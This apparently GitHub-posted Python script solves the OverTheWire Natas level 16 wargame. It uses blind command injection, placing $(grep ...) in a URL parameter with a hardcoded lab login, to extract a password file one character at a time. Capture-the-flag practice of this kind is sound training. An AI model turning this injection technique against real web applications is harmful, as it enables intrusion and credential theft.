![image](https://github.com/user-attachments/assets/5d7dfee1-7f46-43c9-8e01-5f0f573f4412)
![image](https://github.com/user-attachments/assets/2c39bc51-a2e7-4073-8153-68bcb4130758)


import requests  
from requests.auth import HTTPBasicAuth  
  
auth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')  
  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
for char in allchars:  
 r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  
   
 if 'doomed' not in r.text:  
  filteredchars = filteredchars + char  
  print(filteredchars)  
  
for i in range(32):  
 for char in filteredchars:  
  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)  
    
  if 'doomed' not in r.text:  
   passwd = passwd + char  
   print(passwd)  
   break  


this script will work.

![Uploading image.png…]()
